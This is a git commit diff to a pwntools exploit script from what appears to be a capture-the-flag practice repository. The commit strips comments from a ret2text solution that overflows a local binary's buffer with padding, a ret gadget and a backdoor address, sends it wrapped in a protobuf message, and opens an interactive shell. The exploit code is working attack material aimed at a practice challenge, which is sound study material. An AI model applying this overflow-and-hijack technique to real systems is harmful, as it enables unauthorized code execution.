d1d3e4df295810648e1dfc5c8ad039955216c53c
C1rus <164361902+C1rus-dev@users.noreply.github.com>
2024-12-14 21:28:26 +0800

    Update exp.py

--- ELF64 - ret2text/level2 - ez_protobuf/solve/exp.py
+++ ELF64 - ret2text/level2 - ez_protobuf/solve/exp.py
@@ -6,13 +6,11 @@ context.binary = "./main"
 p = process("./main")
 elf = ELF("./main")
 
-# 获取正确的backdoor地址
-backdoor = 0x00000000040131B  # 使用symbols获取真实地址
+backdoor = 0x00000000040131B
 ret = 0x000000000040101a 
 
-# 构造payload
-payload = b'A' * (0x50+8)           # 缓冲区 + 保存的rbp
-payload += p64(ret) + p64(backdoor)  # ret + backdoor地址
+payload = b'A' * (0x50+8)
+payload += p64(ret) + p64(backdoor)
 
 # 构造protobuf消息
 message = magic_pb2.Message()
@@ -20,6 +18,5 @@ message.magic_type = "payload"
 message.magic_content = payload
 message.spell_size = len(payload)
 
-# 发送payload
 p.sendafter(b"Protobuf?\n", message.SerializeToString())
 p.interactive()
